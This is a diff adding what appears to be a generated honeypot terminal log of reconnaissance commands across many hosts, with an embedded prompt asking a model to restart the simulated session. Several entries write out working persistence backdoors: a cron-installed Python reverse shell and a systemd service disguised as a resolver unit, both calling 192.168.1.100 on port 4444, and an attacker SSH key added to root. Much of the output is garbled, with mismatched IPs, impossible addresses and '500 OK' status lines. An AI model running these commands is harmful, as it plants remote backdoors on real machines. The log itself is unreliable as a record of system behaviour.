@@ -1,0 +1,3125 @@
+
+root@honeypot-41:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 1433 Jan 21 06:39
+
+root@honeypot-16:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 3769 Jan 21 08:16
+
+root@honeypot-32:~# uname -a
+Command executed.
+
+root@honeypot-10:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-1:~# whoami
+Command executed.
+
+root@honeypot-21:~# ssh -p 53550 guest@107.122.92.70
+ssh: connect to host 195.136.191.115 port 22: Connection timed out
+
+root@honeypot-47:~# curl -s -o /dev/null -w '%{http_code}' http://118.62.254.9:80/test.php
+HTTP/1.1 301 OK
+
+root@honeypot-7:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 1036 Jan 21 21:44
+
+root@honeypot-11:~# id
+Command executed.
+
+root@honeypot-13:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-4:~# cat /var/log/auth.log.20260117020530
+-rw-r--r-- 1 root root 6996 Jan 21 06:37
+
+root@honeypot-28:~# uname -a
+Command executed.
+
+root@honeypot-41:~# cat /proc/version
+-rw-r--r-- 1 root root 7690 Jan 21 13:11
+
+root@honeypot-42:~# ssh -p 27017 guest@164.155.169.175
+ssh: connect to host 29.100.28.29 port 22: Connection timed out
+
+root@honeypot-40:~# nmap -sV -p 10-40 122.194.204.228
+Starting Nmap scan... Host is up (0.08s latency).
+
+root@honeypot-43:~# nmap -sU -p 53,161,123 135.29.16.88
+Starting Nmap scan... Host is up (0.60s latency).
+
+root@honeypot-23:~# ssh ubuntu@72.54.0.38 -o ConnectTimeout=3
+ssh: connect to host 193.13.81.110 port 22: Connection timed out
+
+root@honeypot-42:~# ss -tunlp | grep 2909
+Command executed.
+
+root@honeypot-50:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 2698 Jan 21 00:28
+
+root@honeypot-48:~# wget -q --spider http://254.184.189.131/robots.txt
+HTTP/1.1 500 OK
+
+root@honeypot-10:~# ping -c 1 151.81.156.139
+PING: 64 bytes from 176.130.115.66: icmp_seq=1 ttl=64 time=11.4 ms
+
+root@honeypot-27:~# curl -s -o /dev/null -w '%{http_code}' http://188.42.126.19:35431/wp-admin/
+HTTP/1.1 500 OK
+
+root@honeypot-29:~# nmap -sV -p 481-516 2.56.11.84
+Starting Nmap scan... Host is up (0.12s latency).
+
+root@honeypot-1:~# ls -la /tmp/f591f45b
+-rw-r--r-- 1 root root 7261 Jan 21 10:55
+
+root@honeypot-39:~# nmap -sS -O 182.210.173.233
+Starting Nmap scan... Host is up (0.20s latency).
+
+root@honeypot-39:~# ls -la /tmp/bd0ddfcb
+Permission denied
+
+root@honeypot-49:~# ssh guest@23.62.213.204 -o ConnectTimeout=3
+ssh: connect to host 6.35.92.240 port 22: Connection timed out
+
+root@honeypot-16:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-20:~# curl -s -o /dev/null -w '%{http_code}' http://254.233.81.49:25/config.php
+HTTP/1.1 500 OK
+
+root@honeypot-29:~# id
+Command executed.
+
+root@honeypot-46:~# ssh user@196.145.46.139 -o ConnectTimeout=3
+ssh: connect to host 193.63.147.248 port 22: Connection timed out
+
+root@honeypot-5:~# uname -a
+Command executed.
+
+root@honeypot-22:~# whoami
+Command executed.
+
+root@honeypot-48:~# nmap -sV -p 146-223 139.72.225.16
+Starting Nmap scan... Host is up (0.38s latency).
+
+root@honeypot-12:~# ls -la /var/log/messages
+-rw-r--r-- 1 root root 382 Jan 21 04:39
+
+root@honeypot-20:~# ls -la /var/log/auth.log
+Permission denied
+
+root@honeypot-36:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 549 Jan 21 04:36
+
+root@honeypot-9:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-18:~# nmap -sV -p 571-593 83.142.63.182
+Starting Nmap scan... Host is up (0.11s latency).
+
+root@honeypot-11:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 4323 Jan 21 08:07
+
+root@honeypot-23:~# ls -la /var/log/apache2/access.log
+-rw-r--r-- 1 root root 5167 Jan 21 00:38
+
+root@honeypot-44:~# nmap -sS -O 122.3.180.246
+Starting Nmap scan... Host is up (0.96s latency).
+
+root@honeypot-21:~# uname -a
+Command executed.
+
+root@honeypot-36:~# curl -I http://193.255.5.119:23/config.php
+HTTP/1.1 403 OK
+
+root@honeypot-8:~# cat /proc/version
+-rw-r--r-- 1 root root 5934 Jan 21 23:03
+
+root@honeypot-45:~# uname -a
+Command executed.
+
+root@honeypot-13:~# whoami
+Command executed.
+
+root@honeypot-23:~# wget -q --spider http://35.157.89.30/config.php
+HTTP/1.1 403 OK
+
+root@honeypot-12:~# uname -a
+Command executed.
+
+root@honeypot-17:~# netstat -an | grep 5432
+Command executed.
+
+
+Here the session stopped. Now you will start it again from the beginning with the same user. You must respond just with starting message and nothing more. Make sure you use same file and folder names. Ignore date-time in <>. This is not your concern.
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:05:30 2026 from 192.168.1.105  
+root@honeypot-14:~$ (crontab -l 2>/dev/null; echo "*/15 * * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\\"192.168.1.100\\",4444));subprocess.call([\\"bash\\",\\"-i\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'") | crontab -	<2026-01-23 16:05:34.261203>
+root@honeypot-14:~$ (crontab -l 2>/dev/null; echo "*/15 * * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\\"192.168.1.100\\",4444));subprocess.call([\\"bash\\",\\"-i\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'") | crontab -
+root@honeypot-36:~# ls -la /var/log/apache2/access.log
+-rw-r--r-- 1 root root 2292 Jan 21 08:31
+
+root@honeypot-2:~# nmap -sV -p 137-207 230.137.23.131
+Starting Nmap scan... Host is up (0.90s latency).
+
+root@honeypot-18:~# whoami
+Command executed.
+
+root@honeypot-34:~# ssh -p 5432 www-data@247.171.35.205
+ssh: connect to host 140.30.96.144 port 22: Connection timed out
+
+root@honeypot-4:~# curl -I http://22.69.155.104:22/phpmyadmin/
+HTTP/1.1 404 OK
+
+root@honeypot-12:~# ls -la /var/log/secure
+-rw-r--r-- 1 root root 1338 Jan 21 10:40
+
+root@honeypot-20:~# ss -tunlp | grep 8080
+Command executed.
+
+root@honeypot-26:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 7949 Jan 21 04:53
+
+root@honeypot-25:~# uname -a
+Command executed.
+
+root@honeypot-41:~# uname -a
+Command executed.
+
+root@honeypot-4:~# ls -la /var/log/messages
+Permission denied
+
+root@honeypot-23:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-50:~# netstat -an | grep 80
+Command executed.
+
+root@honeypot-34:~# cat /proc/version
+-rw-r--r-- 1 root root 9858 Jan 21 15:35
+
+root@honeypot-40:~# nmap -sS -O 55.179.63.254
+Starting Nmap scan... Host is up (0.89s latency).
+
+root@honeypot-3:~# id
+Command executed.
+
+root@honeypot-20:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-32:~# cat /proc/version
+Permission denied
+
+root@honeypot-25:~# nmap -sV -p 433-444 229.126.241.201
+Starting Nmap scan... Host is up (0.65s latency).
+
+root@honeypot-45:~# nmap -sV -p 190-221 91.48.33.74
+Starting Nmap scan... Host is up (0.64s latency).
+
+root@honeypot-31:~# wget -q --spider http://66.66.104.95/cmd.php
+HTTP/1.1 403 OK
+
+root@honeypot-1:~# netstat -an | grep 59538
+Command executed.
+
+root@honeypot-39:~# ss -tunlp | grep 23
+Command executed.
+
+root@honeypot-32:~# ss -tunlp | grep 30656
+Command executed.
+
+root@honeypot-12:~# cat /var/log/auth.log.20260121090538
+-rw-r--r-- 1 root root 7103 Jan 21 19:13
+
+root@honeypot-28:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-45:~# uname -a
+Command executed.
+
+root@honeypot-13:~# curl -I http://1.112.10.113:25/admin.php
+HTTP/1.1 301 OK
+
+root@honeypot-33:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 9770 Jan 21 12:47
+
+root@honeypot-6:~# nmap -sS -O 5.214.213.197
+Starting Nmap scan... Host is up (0.94s latency).
+
+root@honeypot-50:~# whoami
+Command executed.
+
+root@honeypot-6:~# ping -c 1 64.72.67.77
+PING: 64 bytes from 208.99.40.152: icmp_seq=1 ttl=64 time=5.6 ms
+
+root@honeypot-20:~# curl -I http://3.34.18.69:80/.env
+HTTP/1.1 404 OK
+
+root@honeypot-42:~# ping -c 1 248.47.187.24
+PING: 64 bytes from 198.126.252.250: icmp_seq=1 ttl=64 time=10.5 ms
+
+root@honeypot-46:~# ping -c 1 66.200.222.177
+PING: 64 bytes from 11.210.58.187: icmp_seq=1 ttl=64 time=11.2 ms
+
+root@honeypot-48:~# nmap -sV -p 498-543 198.234.165.248
+Starting Nmap scan... Host is up (0.26s latency).
+
+root@honeypot-6:~# cat /var/log/auth.log.20260111220538
+-rw-r--r-- 1 root root 2708 Jan 21 11:36
+
+root@honeypot-22:~# ss -tunlp | grep 39102
+Command executed.
+
+root@honeypot-32:~# nmap -sS -O 244.94.211.100
+Starting Nmap scan... Host is up (0.55s latency).
+
+root@honeypot-10:~# cat /var/log/auth.log.20251228070538
+-rw-r--r-- 1 root root 7914 Jan 21 07:29
+
+root@honeypot-1:~# ssh deploy@209.26.222.35 -o ConnectTimeout=3
+ssh: connect to host 35.31.68.248 port 22: Connection timed out
+
+root@honeypot-8:~# curl -s -o /dev/null -w '%{http_code}' http://113.220.227.18:35078/backup.sql
+HTTP/1.1 301 OK
+
+root@honeypot-23:~# nmap -sU -p 53,161,123 142.73.7.45
+Starting Nmap scan... Host is up (0.24s latency).
+
+root@honeypot-25:~# id
+Command executed.
+
+root@honeypot-20:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-43:~# nmap -sS -O 159.3.180.196
+Starting Nmap scan... Host is up (0.38s latency).
+
+root@honeypot-44:~# curl -s -o /dev/null -w '%{http_code}' http://162.227.170.202:22/phpmyadmin/
+HTTP/1.1 200 OK
+
+root@honeypot-31:~# cat /proc/version
+-rw-r--r-- 1 root root 3033 Jan 21 16:13
+
+root@honeypot-38:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-42:~# ssh -p 27017 ftpuser@17.73.41.198
+ssh: connect to host 177.53.73.210 port 22: Connection timed out
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:05:39 2026 from 192.168.1.107  
+root@honeypot-19:~$ crontab -l | grep -E 'python3.*socket.*4444'	<2026-01-23 16:05:42.611290>
+*/15 * * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("192.168.1.100",4444));subprocess.call(["bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+root@honeypot-15:~# uname -a
+Command executed.
+
+root@honeypot-39:~# curl -s -o /dev/null -w '%{http_code}' http://108.209.95.28:443/shell.php
+HTTP/1.1 404 OK
+
+root@honeypot-5:~# whoami
+Command executed.
+
+root@honeypot-32:~# ls -la /var/log/syslog
+-rw-r--r-- 1 root root 6661 Jan 21 01:17
+
+root@honeypot-9:~# nmap -sV -p 874-900 111.150.47.158
+Starting Nmap scan... Host is up (0.10s latency).
+
+root@honeypot-44:~# cat /var/log/auth.log.20260117080742
+-rw-r--r-- 1 root root 9053 Jan 21 19:10
+
+root@honeypot-42:~# cat /proc/version
+-rw-r--r-- 1 root root 3400 Jan 21 23:44
+
+root@honeypot-4:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-35:~# netstat -an | grep 22
+Command executed.
+
+root@honeypot-28:~# whoami
+Command executed.
+
+root@honeypot-22:~# cat /var/log/auth.log.20260103010742
+Permission denied
+
+root@honeypot-32:~# wget -q --spider http://103.194.109.221/cmd.php
+HTTP/1.1 301 OK
+
+root@honeypot-27:~# whoami
+Command executed.
+
+root@honeypot-4:~# nmap -sV -p 433-506 4.239.4.214
+Starting Nmap scan... Host is up (0.06s latency).
+
+root@honeypot-48:~# curl -I http://48.43.58.138:8845/admin.php
+HTTP/1.1 500 OK
+
+root@honeypot-29:~# ss -tunlp | grep 3389
+Command executed.
+
+root@honeypot-37:~# curl -s -o /dev/null -w '%{http_code}' http://147.206.1.42:3389/backup.sql
+HTTP/1.1 403 OK
+
+root@honeypot-47:~# ls -la /tmp/5159bcfc
+-rw-r--r-- 1 root root 701 Jan 21 01:37
+
+root@honeypot-23:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-34:~# nmap -sV -p 41-114 209.99.249.103
+Starting Nmap scan... Host is up (0.79s latency).
+
+root@honeypot-23:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-49:~# whoami
+Command executed.
+
+root@honeypot-13:~# cat /var/log/auth.log.20260112210742
+Permission denied
+
+root@honeypot-9:~# ss -tunlp | grep 21
+Command executed.
+
+root@honeypot-8:~# curl -I http://82.63.132.148:5432/.env
+HTTP/1.1 301 OK
+
+root@honeypot-36:~# wget -q --spider http://90.237.1.10/config.php
+HTTP/1.1 200 OK
+
+root@honeypot-37:~# curl -I http://57.129.56.214:21/robots.txt
+HTTP/1.1 500 OK
+
+root@honeypot-5:~# ping -c 1 58.37.223.253
+PING: 64 bytes from 193.79.146.84: icmp_seq=1 ttl=64 time=28.6 ms
+
+root@honeypot-10:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 9419 Jan 21 20:05
+
+root@honeypot-28:~# ping -c 1 220.219.68.58
+PING: 64 bytes from 14.151.211.53: icmp_seq=1 ttl=64 time=30.9 ms
+
+root@honeypot-24:~# cat /proc/version
+-rw-r--r-- 1 root root 4873 Jan 21 00:39
+
+root@honeypot-49:~# ssh -p 443 ftpuser@246.159.189.67
+ssh: connect to host 157.199.57.112 port 22: Connection timed out
+
+root@honeypot-36:~# curl -s -o /dev/null -w '%{http_code}' http://136.194.31.185:27017/config.php
+HTTP/1.1 404 OK
+
+root@honeypot-41:~# ss -tunlp | grep 21
+Command executed.
+
+root@honeypot-46:~# cat /proc/version
+-rw-r--r-- 1 root root 9258 Jan 21 23:17
+
+root@honeypot-19:~# ls -la /tmp/48f417d8
+-rw-r--r-- 1 root root 2743 Jan 21 20:54
+
+root@honeypot-1:~# ssh -p 53543 root@233.201.14.106
+ssh: connect to host 152.197.208.182 port 22: Connection timed out
+
+root@honeypot-48:~# curl -I http://176.73.127.92:80/wp-admin/
+HTTP/1.1 500 OK
+
+root@honeypot-41:~# ssh -p 27017 test@182.22.37.2
+ssh: connect to host 171.127.87.4 port 22: Connection timed out
+
+root@honeypot-19:~# id
+Command executed.
+
+root@honeypot-8:~# curl -I http://88.171.3.237:5432/cmd.php
+HTTP/1.1 403 OK
+
+root@honeypot-33:~# cat /var/log/auth.log.20251225050742
+Permission denied
+
+root@honeypot-30:~# ping -c 1 122.83.169.230
+PING: 64 bytes from 140.116.124.244: icmp_seq=1 ttl=64 time=44.9 ms
+
+root@honeypot-43:~# uname -a
+Command executed.
+
+root@honeypot-40:~# ssh -p 27017 test@180.87.61.16
+ssh: connect to host 38.101.12.144 port 22: Connection timed out
+
+root@honeypot-26:~# curl -s -o /dev/null -w '%{http_code}' http://186.13.130.5:21/upload.php
+HTTP/1.1 500 OK
+
+root@honeypot-11:~# wget -q --spider http://58.13.136.205/admin.php
+HTTP/1.1 200 OK
+
+root@honeypot-22:~# ls -la /tmp/b5c5c390
+-rw-r--r-- 1 root root 8272 Jan 21 08:14
+
+root@honeypot-27:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-39:~# netstat -an | grep 63240
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:07:43 2026 from 192.168.1.112  
+root@honeypot-17:~$ cat > /etc/systemd/system/dbus-org.freedesktop.resolve1.service << 'EOF'	<2026-01-23 16:07:46.794436>
+Command executed. [Unit]	<2026-01-23 16:07:48.472399>
+Command executed. Description=Network Name Resolution	<2026-01-23 16:07:49.762286>
+Command executed. After=network.target	<2026-01-23 16:07:51.147730>
+Command executed. 	<2026-01-23 16:07:52.712997>
+Command executed. [Service]	<2026-01-23 16:07:54.329084>
+Command executed. ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'	<2026-01-23 16:07:55.623628>
+Command executed. Restart=always	<2026-01-23 16:07:57.002106>
+Command executed. 	<2026-01-23 16:07:58.634335>
+Command executed. [Install]	<2026-01-23 16:08:00.292520>
+Command executed. WantedBy=multi-user.target	<2026-01-23 16:08:02.461413>
+Command executed. EOF	<2026-01-23 16:08:04.103192>
+Command executed. systemctl daemon-reload && systemctl enable dbus-org.freedesktop.resolve1.service	<2026-01-23 16:08:05.268877>
+Command executed.
+root@honeypot-31:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-31:~# whoami
+Command executed.
+
+root@honeypot-26:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-5:~# ssh -p 6379 user@8.62.151.181
+ssh: connect to host 12.24.67.141 port 22: Connection timed out
+
+root@honeypot-8:~# wget -q --spider http://196.33.129.117/admin.php
+HTTP/1.1 200 OK
+
+root@honeypot-11:~# curl -s -o /dev/null -w '%{http_code}' http://210.101.104.199:34761/.env
+HTTP/1.1 301 OK
+
+root@honeypot-41:~# ssh -p 40818 ftpuser@109.146.135.149
+ssh: connect to host 96.151.27.150 port 22: Connection timed out
+
+root@honeypot-16:~# uname -a
+Command executed.
+
+root@honeypot-24:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-20:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 8338 Jan 21 19:13
+
+root@honeypot-7:~# curl -s -o /dev/null -w '%{http_code}' http://143.156.161.44:6379/backup.sql
+HTTP/1.1 301 OK
+
+root@honeypot-28:~# nmap -sS -O 47.59.64.205
+Starting Nmap scan... Host is up (0.10s latency).
+
+root@honeypot-43:~# curl -s -o /dev/null -w '%{http_code}' http://55.146.142.196:6379/robots.txt
+HTTP/1.1 500 OK
+
+root@honeypot-13:~# uname -a
+Command executed.
+
+root@honeypot-27:~# uname -a
+Command executed.
+
+root@honeypot-13:~# curl -s -o /dev/null -w '%{http_code}' http://166.53.129.112:23/config.php
+HTTP/1.1 200 OK
+
+root@honeypot-23:~# cat /var/log/auth.log.20260105230946
+-rw-r--r-- 1 root root 975 Jan 21 23:24
+
+root@honeypot-46:~# netstat -an | grep 23675
+Command executed.
+
+root@honeypot-31:~# ping -c 1 118.156.201.176
+PING: 64 bytes from 216.226.116.239: icmp_seq=1 ttl=64 time=35.4 ms
+
+root@honeypot-24:~# ls -la /var/log/auth.log
+Permission denied
+
+root@honeypot-49:~# wget -q --spider http://194.203.212.246/.env
+HTTP/1.1 404 OK
+
+root@honeypot-29:~# netstat -an | grep 47594
+Command executed.
+
+root@honeypot-50:~# ls -la /tmp/a22a6d30
+-rw-r--r-- 1 root root 4466 Jan 21 10:28
+
+root@honeypot-12:~# wget -q --spider http://61.125.9.91/shell.php
+HTTP/1.1 500 OK
+
+root@honeypot-25:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-47:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-10:~# ssh root@25.148.56.45 -o ConnectTimeout=3
+ssh: connect to host 120.167.9.84 port 22: Connection timed out
+
+root@honeypot-24:~# ping -c 1 24.96.100.213
+PING: 64 bytes from 238.37.3.100: icmp_seq=1 ttl=64 time=17.8 ms
+
+root@honeypot-16:~# whoami
+Command executed.
+
+root@honeypot-23:~# wget -q --spider http://87.165.61.246/phpmyadmin/
+HTTP/1.1 301 OK
+
+root@honeypot-6:~# ssh -p 443 ftpuser@228.191.23.117
+ssh: connect to host 139.91.117.61 port 22: Connection timed out
+
+root@honeypot-32:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 5039 Jan 21 22:04
+
+root@honeypot-5:~# nmap -sV -p 939-1019 69.19.244.54
+Starting Nmap scan... Host is up (0.17s latency).
+
+root@honeypot-38:~# ssh -p 443 admin@182.173.5.160
+ssh: connect to host 136.239.204.166 port 22: Connection timed out
+
+root@honeypot-25:~# wget -q --spider http://143.141.210.10/config.php
+HTTP/1.1 500 OK
+
+root@honeypot-33:~# nmap -sV -p 873-933 212.22.91.215
+Starting Nmap scan... Host is up (0.30s latency).
+
+root@honeypot-18:~# curl -I http://159.214.131.187:21/config.php
+HTTP/1.1 500 OK
+
+root@honeypot-3:~# ls -la /tmp/f5018b4d
+Permission denied
+
+root@honeypot-14:~# ssh -p 25 test@19.84.159.249
+ssh: connect to host 121.103.233.239 port 22: Connection timed out
+
+root@honeypot-18:~# nmap -sU -p 53,161,123 106.213.129.93
+Starting Nmap scan... Host is up (0.57s latency).
+
+root@honeypot-16:~# uname -a
+Command executed.
+
+root@honeypot-5:~# netstat -an | grep 27017
+Command executed.
+
+root@honeypot-25:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 2376 Jan 21 13:05
+
+root@honeypot-46:~# nmap -sV -p 44-94 143.8.236.211
+Starting Nmap scan... Host is up (0.11s latency).
+
+root@honeypot-26:~# wget -q --spider http://254.210.110.175/phpmyadmin/
+HTTP/1.1 403 OK
+
+root@honeypot-35:~# nmap -sS -O 199.70.177.76
+Starting Nmap scan... Host is up (0.68s latency).
+
+root@honeypot-38:~# ss -tunlp | grep 27017
+Command executed.
+
+root@honeypot-34:~# cat /var/log/auth.log.20260105010946
+Permission denied
+
+root@honeypot-44:~# curl -s -o /dev/null -w '%{http_code}' http://22.183.170.247:3306/wp-admin/
+HTTP/1.1 403 OK
+
+root@honeypot-35:~# uname -a
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:09:47 2026 from 192.168.1.115  
+user@server-22:~$ systemctl is-enabled dbus-org.freedesktop.resolve1.service && cat /etc/systemd/system/dbus-org.freedesktop.resolve1.service | grep -E 'tcp.*4444'	<2026-01-23 16:09:51.554362>
+enabled
+ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'
+user@server-22:~$
+root@honeypot-14:~# curl -s -o /dev/null -w '%{http_code}' http://38.68.132.30:9377/shell.php
+HTTP/1.1 500 OK
+
+root@honeypot-14:~# ssh -p 5432 test@238.189.162.164
+ssh: connect to host 223.205.186.33 port 22: Connection timed out
+
+root@honeypot-32:~# netstat -an | grep 443
+Command executed.
+
+root@honeypot-39:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 3843 Jan 21 01:31
+
+root@honeypot-44:~# netstat -an | grep 443
+Command executed.
+
+root@honeypot-19:~# nmap -sS -O 53.255.35.242
+Starting Nmap scan... Host is up (0.74s latency).
+
+root@honeypot-16:~# nmap -sU -p 53,161,123 45.74.216.45
+Starting Nmap scan... Host is up (0.45s latency).
+
+root@honeypot-12:~# ls -la /tmp/ab153cc5
+-rw-r--r-- 1 root root 6080 Jan 21 12:41
+
+root@honeypot-34:~# ls -la /tmp/0cf02541
+-rw-r--r-- 1 root root 9048 Jan 21 10:26
+
+root@honeypot-5:~# ls -la /var/log/secure
+-rw-r--r-- 1 root root 6820 Jan 21 17:34
+
+root@honeypot-4:~# id
+Command executed.
+
+root@honeypot-16:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-14:~# id
+Command executed.
+
+root@honeypot-46:~# cat /proc/version
+Permission denied
+
+root@honeypot-4:~# id
+Command executed.
+
+root@honeypot-2:~# cat /var/log/auth.log.20260111090954
+-rw-r--r-- 1 root root 4686 Jan 21 06:55
+
+root@honeypot-32:~# nmap -sS -O 166.252.195.251
+Starting Nmap scan... Host is up (0.49s latency).
+
+root@honeypot-28:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-29:~# nmap -sU -p 53,161,123 208.64.201.244
+Starting Nmap scan... Host is up (0.56s latency).
+
+root@honeypot-13:~# ls -la /tmp/79899f11
+Permission denied
+
+root@honeypot-25:~# ssh -p 43510 root@119.247.218.92
+ssh: connect to host 145.249.111.162 port 22: Connection timed out
+
+root@honeypot-6:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 4428 Jan 21 04:46
+
+root@honeypot-11:~# ssh -p 21 ftpuser@147.238.79.130
+ssh: connect to host 193.168.177.242 port 22: Connection timed out
+
+root@honeypot-35:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 5352 Jan 21 14:21
+
+root@honeypot-13:~# nmap -sV -p 53-121 189.177.143.22
+Starting Nmap scan... Host is up (0.51s latency).
+
+root@honeypot-47:~# curl -s -o /dev/null -w '%{http_code}' http://102.58.115.105:24801/wp-admin/
+HTTP/1.1 500 OK
+
+root@honeypot-45:~# ping -c 1 62.135.232.226
+PING: 64 bytes from 99.129.112.236: icmp_seq=1 ttl=64 time=0.6 ms
+
+root@honeypot-43:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-31:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 7434 Jan 21 18:51
+
+root@honeypot-36:~# nmap -sS -O 5.177.119.31
+Starting Nmap scan... Host is up (0.43s latency).
+
+root@honeypot-2:~# ls -la /tmp/d8c7ae26
+-rw-r--r-- 1 root root 8995 Jan 21 00:48
+
+root@honeypot-38:~# nmap -sS -O 130.118.167.191
+Starting Nmap scan... Host is up (0.55s latency).
+
+root@honeypot-1:~# ssh -p 25 test@33.173.219.61
+ssh: connect to host 193.232.239.138 port 22: Connection timed out
+
+root@honeypot-20:~# curl -I http://151.136.34.135:80/test.php
+HTTP/1.1 301 OK
+
+root@honeypot-24:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-50:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 6759 Jan 21 11:20
+
+root@honeypot-38:~# curl -s -o /dev/null -w '%{http_code}' http://94.233.117.12:8080/shell.php
+HTTP/1.1 403 OK
+
+root@honeypot-4:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 1198 Jan 21 20:27
+
+root@honeypot-25:~# ss -tunlp | grep 25
+Command executed.
+
+root@honeypot-47:~# ssh -p 80 deploy@112.63.70.160
+ssh: connect to host 20.200.41.152 port 22: Connection timed out
+
+root@honeypot-35:~# cat /var/log/auth.log.20251230090954
+-rw-r--r-- 1 root root 8523 Jan 21 22:05
+
+root@honeypot-39:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-4:~# uname -a
+Command executed.
+
+root@honeypot-13:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-46:~# curl -I http://19.47.162.113:80/admin.php
+HTTP/1.1 403 OK
+
+root@honeypot-22:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-3:~# ss -tunlp | grep 80
+Command executed.
+
+root@honeypot-35:~# ssh -p 5432 root@115.20.19.110
+ssh: connect to host 72.39.67.196 port 22: Connection timed out
+
+root@honeypot-15:~# curl -s -o /dev/null -w '%{http_code}' http://80.138.55.230:5432/phpmyadmin/
+HTTP/1.1 200 OK
+
+root@honeypot-7:~# whoami
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:09:55 2026 from 192.168.1.118  
+admin@server-33:~$ mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fake... c2server@attacker' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys	<2026-01-23 16:09:58.805075>
+Command executed.
+root@honeypot-20:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-24:~# uname -a
+Command executed.
+
+root@honeypot-27:~# whoami
+Command executed.
+
+root@honeypot-26:~# nmap -sV -p 609-649 58.149.37.247
+Starting Nmap scan... Host is up (0.80s latency).
+
+root@honeypot-15:~# nmap -sS -O 16.117.23.71
+Starting Nmap scan... Host is up (0.75s latency).
+
+root@honeypot-33:~# nmap -sS -O 206.52.72.233
+Starting Nmap scan... Host is up (0.55s latency).
+
+root@honeypot-11:~# uname -a
+Command executed.
+
+root@honeypot-6:~# ls -la /tmp/dc48c93f
+Permission denied
+
+root@honeypot-12:~# ls -la /tmp/c64dc1b6
+-rw-r--r-- 1 root root 9684 Jan 21 06:55
+
+root@honeypot-45:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-6:~# cat /var/log/auth.log.20260111211158
+Permission denied
+
+root@honeypot-31:~# ssh www-data@113.155.225.232 -o ConnectTimeout=3
+ssh: connect to host 109.153.216.154 port 22: Connection timed out
+
+root@honeypot-39:~# uname -a
+Command executed.
+
+root@honeypot-14:~# nmap -sV -p 298-355 13.132.7.94
+Starting Nmap scan... Host is up (0.47s latency).
+
+root@honeypot-43:~# netstat -an | grep 25
+Command executed.
+
+root@honeypot-22:~# netstat -an | grep 27017
+Command executed.
+
+root@honeypot-24:~# uname -a
+Command executed.
+
+root@honeypot-34:~# ls -la /tmp/960998c8
+Permission denied
+
+root@honeypot-30:~# ls -la /var/log/apache2/access.log
+-rw-r--r-- 1 root root 9190 Jan 21 23:23
+
+root@honeypot-45:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-37:~# uname -a
+Command executed.
+
+root@honeypot-35:~# ping -c 1 242.241.42.33
+PING: 64 bytes from 66.179.201.31: icmp_seq=1 ttl=64 time=47.0 ms
+
+root@honeypot-1:~# cat /var/log/auth.log.20260116061158
+Permission denied
+
